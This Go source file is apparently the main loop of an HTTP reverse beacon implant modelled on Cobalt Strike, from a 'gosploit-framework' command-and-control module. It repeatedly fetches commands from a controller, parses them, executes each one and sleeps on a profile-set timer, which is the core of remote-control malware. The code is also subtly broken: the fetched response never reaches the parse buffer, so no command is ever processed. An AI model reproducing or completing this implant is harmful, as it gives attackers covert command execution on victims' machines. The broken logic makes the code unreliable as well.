package main

import (
	"bytes"
	"gosploit-framework/external/module/cc/cobaltstrike/http_reverse_beacon/command"
	"gosploit-framework/external/module/cc/cobaltstrike/http_reverse_beacon/profile"
	"time"
)

func main() {
	for {
		resp := GetCommandRequest()
		if resp != nil {
			buf := bytes.NewBuffer([]byte{})
			buf_size := len(buf.Bytes())
			for cursor := 0; cursor < buf_size; {
				cmd, err := command.Parse(buf, &cursor)
				if err != nil {
					break
				}
				cmd.Execute()
			}
		}
		time.Sleep(time.Duration(profile.SleepTime))
	}
}
